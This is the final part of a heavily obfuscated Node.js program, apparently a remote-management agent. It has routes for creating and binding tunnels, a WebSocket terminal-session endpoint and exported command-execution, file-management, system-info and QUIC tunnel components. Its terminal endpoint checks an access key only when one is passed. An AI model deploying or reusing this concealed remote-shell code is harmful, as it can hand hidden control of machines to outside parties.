                    'forwardedFor': y || undefined
                });
                ({
                    status: z,
                    headers: A,
                    res: B
                } = await a0as(u[oj(0xae)], D[oj(0x62e)], D[oj(0xe76)], u['body'] || Buffer['alloc'](0x0), b['Jodei'](Math[oj(0x8b4)](0x5, a0ax[oj(0xed0)]), 0x3e8)));
            } catch (E) {
                const F = E && E[oj(0x5e2)] ? E[oj(0x5e2)] : b[oj(0x31a)], G = b[oj(0x9b5)](F, b['CmEux']) ? 0x193 : b[oj(0x7b7)](F, b['QDiJv']) ? 0x19d : 0x1f6;
                return v[oj(0xab3)](G)['json']({
                    'status': oj(0x755),
                    'code': F,
                    'message': b[oj(0x55a)](String, E && E[oj(0xf18)] || E)[oj(0x174)](0x0, 0x12c)
                });
            }
            v['status'](z)[oj(0x6e7)](b[oj(0xcf1)](a0aq, A))[oj(0x431)](), B['on']('error', () => {
                const ol = oj;
                if (!v[ol(0xad4)])
                    v[ol(0x4d7)]();
            }), B[oj(0x275)](v);
        };
        g['ws'](nD(0x888), a0an), g['ws'](b[nD(0x44c)], a0an), g['all'](b['wBRKF'], o), g[nD(0xb59)](b[nD(0x61f)], o), g['ws'](nD(0xe90), a0an), g['ws'](nD(0xd1b), a0an), g[nD(0xb2b)](b[nD(0x233)], (u, v) => {
            const om = nD, w = j[om(0xcca)]();
            v[om(0x3f9)]({
                'status': 'ok',
                'count': w[om(0x615)],
                'tunnels': w
            });
        }), g[nD(0x649)](nD(0x5bc), async (u, v) => {
            const on = nD;
            try {
                const w = b['fQkHP'](a0cE, u[on(0x72a)]);
                let x = w[on(0x606)];
                (x === undefined || x === null || x === '') && (x = a0ax[on(0xb49)]);
                const y = b[on(0xce6)](Number, x);
                if (!Number[on(0x3f2)](y) || b[on(0xa7c)](y, 0x1) || b[on(0xced)](y, 0xffff))
                    return v[on(0xab3)](0x1a6)[on(0x3f9)]({
                        'status': b[on(0xd49)],
                        'created': ![],
                        'port': x,
                        'message': b[on(0x13a)]
                    });
                const z = await j[on(0xb96)](y, b[on(0x83c)](w['duplicate'], !![]), b['XtHQM'](w[on(0xd75)], !![]) || w[on(0xd75)] === 0x1 || b['RqkIu'](String(w[on(0xd75)])[on(0x777)](), on(0xd97)), {
                    'source': b[on(0x9b6)],
                    'shz': b[on(0x2b2)](w[on(0x7ba)], !![]) || b[on(0x41f)](w['shz'], 0x1) || b[on(0x86e)](String(w[on(0x7ba)])[on(0x777)](), b[on(0x891)]),
                    'shzName': b[on(0xb7f)](w[on(0xe4e)], undefined) || w[on(0xe4e)] === null || b[on(0xae1)](w[on(0xe4e)], '') ? null : w[on(0xe4e)],
                    'shzKey': b[on(0x75f)](w[on(0xbc3)], undefined) || b['hQsat'](w['shz_key'], null) || w[on(0xbc3)] === '' ? null : w[on(0xbc3)]
                });
                v['json']({
                    'status': 'ok',
                    'created': !![],
                    'tunnel_domain': z[on(0x249)],
                    'port': z[on(0x606)],
                    'created_at': z[on(0x56d)],
                    'transport': z[on(0xb54)],
                    'tunnel_status': z[on(0xab3)] || on(0x6e0),
                    'last_error': z[on(0x409)] ?? null,
                    'last_error_at': z[on(0xb05)] ?? null,
                    'consecutive_failures': z[on(0x531)] || 0x0,
                    'shz_name': z[on(0xdc8)] ?? null,
                    'shz_url': z[on(0xdc8)] ? b['IVClS'] + z[on(0xdc8)] : null
                });
            } catch (A) {
                v['status'](A[on(0xab3)] || 0x1f4)['json']({
                    'status': b[on(0xd49)],
                    'created': ![],
                    'port': A[on(0x606)] ?? null,
                    'message': A[on(0xf18)]
                });
            }
        }), g[nD(0xcd1)](b[nD(0x233)], async (u, v) => {
            const oo = nD;
            try {
                const w = b['RMnAp'](a0cE, u[oo(0x72a)]), x = w[oo(0x606)], y = Number(x);
                if (b[oo(0x4d3)](x, undefined) || x === null || x === '' || !Number[oo(0x3f2)](y) || b[oo(0xa7c)](y, 0x1) || y > 0xffff)
                    return v[oo(0xab3)](0x1a6)[oo(0x3f9)]({
                        'status': b[oo(0xd49)],
                        'deleted': 0x0,
                        'port': b['nGLIF'](x, null),
                        'message': b[oo(0x399)]
                    });
                const z = await j[oo(0xea4)](y, w[oo(0x762)]);
                if (z['status'] === 'ok')
                    return v[oo(0x3f9)]({
                        'status': 'ok',
                        'deleted': z[oo(0xafb)],
                        'port': y,
                        'tunnels': z[oo(0x8a8)]
                    });
                return v[oo(0xab3)](z[oo(0xab3)])['json']({
                    'status': b['yFWBX'],
                    'deleted': 0x0,
                    'port': y,
                    'message': z[oo(0xf18)]
                });
            } catch (A) {
                v[oo(0xab3)](0x1f4)[oo(0x3f9)]({
                    'status': b[oo(0xd49)],
                    'deleted': 0x0,
                    'message': A['message']
                });
            }
        }), g[nD(0x649)](b[nD(0x190)], async (u, v) => {
            const op = nD;
            try {
                const w = b[op(0x428)](a0cE, u[op(0x72a)]), x = w['port'], y = b[op(0x8fb)](Number, x);
                if (x === undefined || b[op(0x80a)](x, null) || b[op(0xe16)](x, '') || !Number[op(0x3f2)](y) || b[op(0x803)](y, 0x1) || b[op(0x2e0)](y, 0xffff))
                    return v[op(0xab3)](0x1a6)[op(0x3f9)]({
                        'status': b['yFWBX'],
                        'bound': ![],
                        'port': b['nGLIF'](x, null),
                        'message': b['gKmCS']
                    });
                const z = await j[op(0x82e)](y, b[op(0xc2f)](w[op(0x762)], undefined) || b['YQCXP'](w['tunnel_domain'], null) || b[op(0x7ce)](w['tunnel_domain'], '') ? null : w[op(0x762)], b[op(0x47b)](w[op(0xe4e)], undefined) || b[op(0x80a)](w[op(0xe4e)], null) || b[op(0x80a)](w[op(0xe4e)], '') ? null : w[op(0xe4e)], w[op(0xbc3)] === undefined || w[op(0xbc3)] === null || b[op(0xb7f)](w[op(0xbc3)], '') ? null : w[op(0xbc3)]);
                if (b[op(0x7ce)](z[op(0xab3)], 'ok'))
                    return v[op(0x3f9)](z);
                return v['status'](z['status'])['json']({
                    'status': op(0x755),
                    'bound': ![],
                    'port': y,
                    'message': z['message']
                });
            } catch (A) {
                v[op(0xab3)](0x1f4)[op(0x3f9)]({
                    'status': b[op(0xd49)],
                    'bound': ![],
                    'message': A[op(0xf18)]
                });
            }
        }), g[nD(0xcd1)](b[nD(0x190)], async (u, v) => {
            const oq = nD;
            try {
                const w = a0cE(u[oq(0x72a)]), x = w[oq(0x606)], y = b[oq(0x55a)](Number, x);
                if (b['hQsat'](x, undefined) || b[oq(0x41f)](x, null) || b[oq(0x1c3)](x, '') || !Number[oq(0x3f2)](y) || y < 0x1 || y > 0xffff)
                    return v[oq(0xab3)](0x1a6)[oq(0x3f9)]({
                        'status': b[oq(0xd49)],
                        'bound': ![],
                        'port': b[oq(0x1f7)](x, null),
                        'message': b[oq(0x399)]
                    });
                const z = await j[oq(0xdcc)](y, b['aQckg'](w[oq(0x762)], undefined) || b[oq(0xef6)](w['tunnel_domain'], null) || b[oq(0xee5)](w['tunnel_domain'], '') ? null : w[oq(0x762)]);
                if (z[oq(0xab3)] === 'ok')
                    return v[oq(0x3f9)](z);
                return v[oq(0xab3)](z[oq(0xab3)])[oq(0x3f9)]({
                    'status': b[oq(0xd49)],
                    'bound': ![],
                    'port': y,
                    'message': z[oq(0xf18)]
                });
            } catch (A) {
                v['status'](0x1f4)[oq(0x3f9)]({
                    'status': b['yFWBX'],
                    'bound': ![],
                    'message': A[oq(0xf18)]
                });
            }
        }), a0R[nD(0xb89)](nD(0xe52)), g['ws'](b[nD(0x219)], async (u, v) => {
            const or = nD, w = v[or(0x4e6)][0x0];
            a0R[or(0xb89)]('WebSocket\x20request\x20URL:\x20'[or(0x7b6)](v[or(0x62e)])), a0R[or(0xb89)]('Matched\x20Sub-path:\x20'[or(0x7b6)](w));
            const x = v[or(0x302)]['request_id'], y = v[or(0x302)][or(0x56e)], z = v['query'][or(0x1c7)] === '1', A = b[or(0x1fe)](v[or(0x302)][or(0xeae)], '1');
            a0R[or(0xb89)](or(0x412)[or(0x7b6)](x));
            if (!x) {
                a0R[or(0xb89)](or(0xe5b)), u[or(0xd81)](0x3f0, b[or(0xe8c)]);
                return;
            }
            if (y) {
                const C = a0ax[or(0x963)](), D = Buffer['from'](String(y), or(0x920)), E = Buffer[or(0x58d)](C, b['IeOSt']), F = b[or(0xb2a)](D['length'], E[or(0x615)]) && a0k['timingSafeEqual'](D, E);
                if (!F) {
                    a0R['warn'](or(0x414)[or(0x7b6)](x, or(0x90f))), u[or(0xd81)](0x3f0, b[or(0xc6f)]);
                    return;
                }
            }
            const B = new a0cU();
            await B['startSession'](u, x, y, z, A);
        }), a0R[nD(0xb89)](b[nD(0x229)]), a0aO[nD(0xf0b)]();
        const p = a0aN['getProxyports']();
        if (p[nD(0x4bc)]['length'] || p[nD(0x88e)][nD(0x615)]) {
            if (p[nD(0x4bc)][nD(0x615)])
                b[nD(0xcb4)](a0al, a0ad, p[nD(0x4bc)]);
            if (p['local']['length'])
                b['swnib'](a0al, a0ae, p[nD(0x88e)]);
            a0R[nD(0x6e3)](nD(0x8e3)[nD(0x7b6)](p[nD(0x4bc)][nD(0x615)], '\x20个,\x20本地组\x20')[nD(0x7b6)](p['local']['length'], '\x20个'));
        }
        for (const u of a0aN[nD(0xe9a)]()) {
            l[nD(0x59a)](u);
        }
        a0R[nD(0xb89)](b[nD(0xdad)]);
        const q = g[nD(0x88c)](a0ax[nD(0xb49)], a0ax['HOST'], () => {
            const ot = nD;
            a0R['debug'](ot(0x8ef)[ot(0x7b6)](a0ax[ot(0x9c3)], ot(0xeb7))[ot(0x7b6)](a0ax[ot(0x1e0)], ':')[ot(0x7b6)](a0ax[ot(0xb49)])), a0R['debug'](b[ot(0x278)]);
            (b['dlFLP'](a0ax[ot(0xa6a)], '1') || b[ot(0x359)](a0ax[ot(0xa6a)], '2') && a0cK[ot(0xc2a)]()) && a0cK[ot(0xc9b)](j);
            for (const v of a0aN[ot(0x7f8)]()) {
                j[ot(0xb96)](v['port'], ![], ![], { 'source': b['xOQCw'] })[ot(0x9f0)](() => j['bind'](v['port'], null, v[ot(0xe77)], v[ot(0xd79)] ?? null))[ot(0x9f0)](w => {
                    const ou = ot;
                    w && w[ou(0xab3)] === 'ok' ? a0R[ou(0x6e3)]('[ArgoBind]\x20✅\x20已恢复绑定:\x20'[ou(0x7b6)](v[ou(0xe77)], ou(0x407))['concat'](v[ou(0x606)], ')')) : a0R[ou(0x9cd)](ou(0xd50)[ou(0x7b6)](v[ou(0xe77)], '\x20(port\x20')['concat'](v['port'], ou(0xa46))[ou(0x7b6)](w && w[ou(0xf18)], ou(0xbb3)));
                })['catch'](w => a0R[ot(0x9cd)]('[ArgoBind]\x20⚠️\x20恢复绑定\x20'[ot(0x7b6)](v[ot(0xe77)], '\x20(port\x20')[ot(0x7b6)](v[ot(0x606)], ot(0xa46))[ot(0x7b6)](w['message'], '),\x20条目保留')));
            }
            b['FlGGy'](a0ax[ot(0xa6a)], '3') && m && m[ot(0xb58)]();
            for (const w of l) {
                const x = String(w['kname'] || '')[ot(0x27f)]()[ot(0x777)]();
                if (k[ot(0xb2b)](x)) {
                    a0R[ot(0x9cd)](ot(0xf1)['concat'](x, ot(0x258)));
                    continue;
                }
                const y = new a0cH(w[ot(0x4bc)], w[ot(0x973)], a0ax[ot(0xb49)], w['ports'], i, 'dynamic');
                k['items'][ot(0x6e7)](x, y), y['start'](), a0R['info']('[KMODE3]\x20✅\x20已恢复动态注册项:\x20'[ot(0x7b6)](x, ot(0xa92))[ot(0x7b6)](w[ot(0x4bc)]));
            }
            b[ot(0x94b)](process[ot(0x109)], b[ot(0x15f)]) && b['JoVpR'](typeof Bun, b[ot(0x747)]) && b[ot(0x470)](a0Q)[ot(0xef4)](() => {
            });
        });
        process['on'](b[nD(0xb8b)], () => {
            const ov = nD;
            a0R[ov(0xb89)](b[ov(0x789)]), q[ov(0xd81)](), process['exit'](0x0);
        }), a0R['debug'](b[nD(0x199)]);
    } catch (v) {
        a0R[nD(0x755)](nD(0x3ca), v), process[nD(0x9e4)](0x1);
    }
}
(require['main'] === module || require[a0d0(0x182)]?.[a0d0(0x70c)]?.[a0d0(0xd32)](a0d0(0x14a))) && a0cW()['catch'](a0R[a0d0(0x755)]);
module[a0d0(0xad2)] = {
    'main': a0cW,
    'loadCurves': a0cV,
    'Config': a0ax,
    'CryptoManager': a0aF,
    'SystemInfoCollector': a0aI,
    'CommandExecutor': a0aJ,
    'FileManager': a0aM,
    'TaskManager': a0aO,
    'TaskStore': a0aN,
    'ArgoTunnelManager': a0cF,
    'argoBackoffSeconds': a0cA,
    'argoTruncateError': a0cB,
    'argoRetryBaseSeconds': a0cy,
    'argoRetryMaxSeconds': a0cz,
    'argoReregisterAfter': a0cw,
    'argoBindName': a0cM,
    'argoBindKey': a0cN,
    'argoBindError': a0cO,
    'KModeController': a0cK,
    'HubTunnelManager': a0cH,
    'HubWSStream': a0cI,
    'HubRegisterError': a0aw,
    'HubTunnelRegistrar': a0cJ,
    'hubKnameError': a0a7,
    'hubPublicUrlError': a0a9,
    'deriveHubWsUrl': a0aa,
    'filterLoopbackHeaders': a0ab,
    'hubBackoffSeconds': a0au,
    'parseHubPorts': a0a6,
    'PROXY_STRIPPED_AUTH_HEADERS': a0ac,
    'makeRelayError': a0ao,
    'httpRequestRaw': a0ap,
    'httpRequestStream': a0as,
    'relayLoopbackPrepare': a0ar,
    'filterProxyResponseHeaders': a0aq,
    'relayLoopbackHttp': a0at,
    'proxyRuntimePorts': a0ah,
    'proxyEffectivePorts': a0aj,
    'proxySetRuntimePorts': a0al,
    'proxyMergeRuntimePorts': a0am,
    'proxyGroupsSnapshot': a0ai,
    'cleanPortList': a0ak,
    'PROXY_GROUP_HUB': a0ad,
    'PROXY_GROUP_LOCAL': a0ae,
    'PROXY_RUNTIME_PORTS': a0af,
    'proxyWsRelayHandler': a0an,
    'ZipArchiver': a0aL,
    'TempKeyManager': a0aE,
    'SecureDns': a0aA,
    'installDnsHook': a0aD,
    'patchDnsLookup': a0aC,
    'QuicConnection': a0cn,
    'QuicSession': a0cs,
    'QuicTlsClient': a0ck,
    'QuicKeys': a0c4,
    'QuicReader': a0c0,
    'quicInitialKeys': a0c6,
    'quicNextKeys': a0c5,
    'quicWriteVarint': a0bX,
    'quicReadVarint': a0bY,
    'quicDecodePacketNumber': a0cd,
    'quicApplyProtection': a0cb,
    'quicRemoveProtection': a0cc,
    'quicEncodeTransportParameters': a0ch,
    'quicDecodeTransportParameters': a0cg,
    'quicEncodeAck': a0ce,
    'quicRangesFromAck': a0cf,
    'hkdfExpandLabel': a0c3,
    'CapnpBuilder': a0b7,
    'capnpMessages': a0ba,
    'capnpWords': a0bc,
    'capnpStruct': a0bb,
    'capnpText': a0be,
    'capnpStructList': a0bd,
    'capnpReturnResult': a0bf,
    'capnpConnectRequest': a0bg,
    'capnpConnectResponse': a0bh,
    'connectEdgeQuic': a0ct,
    'buildQuicRequest': a0cp,
    'verifyEdgeQuicCertificate': a0cl,
    'QUIC_DATA_STREAM_PREAMBLE': a0bA,
    'QUIC_SERVER_NAME': a0bJ,
    'QUIC_ALPN': a0bI,
    '__ptySelector': {
        'detectLinuxLibc': a0I,
        'ptyCandidateOrder': a0J,
        'probePtyModule': a0L,
        'ensurePty': a0Q,
        'PTY_QWQO_VERSION': a0G,
        'PTY_CLOSE_REASON': a0H,
        'qwqoPlatformBinaryPath': a0O,
        'selectPtyImplementation': a0P,
        'getState': () => ({
            'ready': !!a0C,
            'reason': a0D
        })
    }
};